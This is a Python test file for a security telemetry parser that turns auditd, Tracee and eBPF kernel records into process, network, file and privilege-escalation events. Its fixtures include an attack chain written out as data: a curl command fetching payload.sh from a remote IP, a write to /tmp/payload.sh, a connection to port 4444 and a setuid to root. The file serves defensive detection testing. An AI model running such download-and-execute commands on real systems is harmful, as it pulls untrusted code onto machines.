"""Tests for M3 kernel-record normalisation (auditd, Tracee, eBPF)."""

from __future__ import annotations

from backend.core.events import EventKind
from backend.telemetry.parsers import AuditRecordParser, _parse_saddr, normalize_kernel_record


def _run_parser(lines):
    parser = AuditRecordParser()
    out = []
    for line in lines:
        out.extend(parser.feed(line))
    out.extend(parser.flush())
    return out


SYSCALL = 'type=SYSCALL msg=audit({ts}:{serial}): arch=c000003e syscall={syscall} success={ok} exit={exit} a0={a0} a1=7ffd a2=16 a3=0 items=1 ppid={ppid} pid={pid} auid=1000 uid={uid} gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="{comm}" exe="{exe}" key="{key}"'


def test_auditd_execve_emits_create_and_exec():
    lines = [
        SYSCALL.format(ts=1710000000.123, serial=1001, syscall=59, ok="yes", exit=0, a0="55c4d", ppid=1200, pid=1300, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=EXECVE msg=audit(1710000000.123:1001): argc=3 a0="curl" a1="-fsSL" a2="http://185.220.101.42/payload.sh"',
        'type=PATH msg=audit(1710000000.123:1001): item=0 name="/usr/bin/bash" inode=1234 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[0].exe == "/usr/bin/bash"
    assert events[0].pid == 1300
    assert events[0].ppid == 1200
    assert events[1].cmdline == ("curl", "-fsSL", "http://185.220.101.42/payload.sh")


def test_auditd_connect_emits_network_event():
    lines = [
        SYSCALL.format(ts=1710000001.456, serial=1002, syscall=42, ok="yes", exit=0, a0="3", ppid=1300, pid=1301, uid=1000, comm="bash", exe="/usr/bin/curl", key="web"),
        'type=SOCKADDR msg=audit(1710000001.456:1002): saddr=02000050A8E01DBA7F0000000000000000',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    event = events[0]
    assert event.kind == EventKind.NETWORK_CONNECT
    assert event.details["remote_ip"] == "168.224.29.186"
    assert event.details["remote_port"] == 80


def test_auditd_successive_events_flush_in_order():
    exec_lines = [
        SYSCALL.format(ts=1710000000.123, serial=1001, syscall=59, ok="yes", exit=0, a0="x", ppid=1200, pid=1300, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=EXECVE msg=audit(1710000000.123:1001): argc=1 a0="bash"',
    ]
    conn_lines = [
        SYSCALL.format(ts=1710000001.456, serial=1002, syscall=42, ok="yes", exit=0, a0="3", ppid=1300, pid=1301, uid=1000, comm="bash", exe="/usr/bin/curl", key="web"),
        'type=SOCKADDR msg=audit(1710000001.456:1002): saddr=02000050A8E01DBA',
    ]
    events = _run_parser(exec_lines + conn_lines)
    assert [e.kind for e in events] == [
        EventKind.PROCESS_CREATED,
        EventKind.EXEC,
        EventKind.NETWORK_CONNECT,
    ]


def test_auditd_openat_in_tmp_is_file_write():
    lines = [
        SYSCALL.format(ts=1710000002.100, serial=1003, syscall=257, ok="yes", exit=3, a0="ffffff9c", ppid=1301, pid=1302, uid=1000, comm="curl", exe="/usr/bin/curl", key="web"),
        'type=PATH msg=audit(1710000002.100:1003): item=0 name="/tmp/payload.sh" inode=999 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_WRITE
    assert events[0].details["path"] == "/tmp/payload.sh"


def test_auditd_regular_read_is_file_read():
    lines = [
        SYSCALL.format(ts=1710000002.200, serial=1004, syscall=257, ok="yes", exit=3, a0="ffffff9c", ppid=1301, pid=1302, uid=1000, comm="cat", exe="/usr/bin/cat", key="web"),
        'type=PATH msg=audit(1710000002.200:1004): item=0 name="/home/dev/notes.txt" inode=500 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_READ


def test_auditd_setuid_is_privilege_escalation():
    lines = [
        SYSCALL.format(ts=1710000003.200, serial=1005, syscall=105, ok="yes", exit=0, a0="0", ppid=1303, pid=1304, uid=1000, comm="bash", exe="/usr/bin/bash", key="escalation"),
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    event = events[0]
    assert event.kind == EventKind.PRIVILEGE_ESCALATION
    assert event.details["from_uid"] == 1000
    assert event.details["to_uid"] == 0


def test_auditd_failed_syscalls_are_skipped():
    lines = [
        SYSCALL.format(ts=1710000004.000, serial=1006, syscall=59, ok="no", exit=-13, a0="x", ppid=1, pid=99, uid=0, comm="bash", exe="/usr/bin/false", key="web"),
    ]
    assert _run_parser(lines) == []


def test_auditd_unrelated_records_ignored():
    lines = [
        'type=DAEMON_START msg=audit(1710000005.000:1007): op=start ver=3.0.7 format=enriched',
        'type=AVC msg=audit(1710000005.001:1008): apparmor="DENIED" operation=open profile=foo',
    ]
    assert _run_parser(lines) == []


def test_auditd_garbage_line_ignored():
    assert _run_parser(["not an audit line"]) == []


def test_saddr_inet():
    assert _parse_saddr("02000050A8E01DBA") == ("168.224.29.186", 80)


def test_saddr_inet6():
    hexstr = "0A000050" "00000000" "20010db8000000000000000000000001" "00000000"
    assert _parse_saddr(hexstr) == ("2001:db8:0:0:0:0:0:1", 80)


def test_tracee_execve():
    events = normalize_kernel_record(
        {
            "timestamp": 1710000000123456789,
            "processId": 1300,
            "parentProcessId": 1200,
            "userId": 1000,
            "eventName": "execve",
            "args": [
                {"name": "pathname", "value": "/usr/bin/curl"},
                {"name": "argv", "value": "curl -fsSL http://185.220.101.42/payload.sh"},
            ],
            "returnValue": 0,
        }
    )
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[1].cmdline == ("curl", "-fsSL", "http://185.220.101.42/payload.sh")


def test_tracee_connect():
    events = normalize_kernel_record(
        {
            "processId": 1300,
            "parentProcessId": 1200,
            "userId": 1000,
            "eventName": "connect",
            "args": [{"name": "sockaddr", "value": "185.220.101.42:4444"}],
            "returnValue": 0,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.NETWORK_CONNECT
    assert events[0].details["remote_ip"] == "185.220.101.42"
    assert events[0].details["remote_port"] == 4444


def test_tracee_openat_write_flags():
    events = normalize_kernel_record(
        {
            "processId": 1301,
            "parentProcessId": 1300,
            "eventName": "openat",
            "args": [
                {"name": "pathname", "value": "/tmp/payload.sh"},
                {"name": "flags", "value": "65"},
            ],
            "returnValue": 3,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_WRITE


def test_tracee_setuid():
    events = normalize_kernel_record(
        {
            "processId": 1304,
            "parentProcessId": 1303,
            "userId": 1000,
            "eventName": "setuid",
            "args": [{"name": "uid", "value": 0}],
            "returnValue": 0,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.PRIVILEGE_ESCALATION
    assert events[0].details["to_uid"] == 0


def test_tracee_failed_syscall_skipped():
    assert (
        normalize_kernel_record(
            {"eventName": "execve", "processId": 1, "returnValue": -13, "args": []}
        )
        == []
    )


def test_tracee_unknown_event_skipped():
    assert normalize_kernel_record({"eventName": "futex", "processId": 1, "returnValue": 0, "args": []}) == []


def test_bpf_style_record_execve():
    events = normalize_kernel_record(
        {
            "pid": 1300,
            "ppid": 1200,
            "uid": 1000,
            "name": "execve",
            "exe": "/usr/bin/curl",
            "argv": ["curl", "-fsSL", "http://x"],
            "return_value": 0,
        }
    )
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[1].cmdline == ("curl", "-fsSL", "http://x")
